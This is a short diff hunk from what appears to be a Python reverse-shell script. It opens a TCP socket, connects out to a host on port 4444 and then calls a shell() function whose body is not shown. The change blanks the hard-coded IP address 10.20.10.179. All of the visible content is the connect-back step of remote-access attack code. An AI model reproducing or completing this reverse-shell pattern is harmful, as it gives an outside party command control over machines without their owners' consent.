@@ -67,5 +67,5 @@ def shell():
 
 
 soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-soc.connect(('10.20.10.179', 4444))
+soc.connect(('', 4444))
 shell()
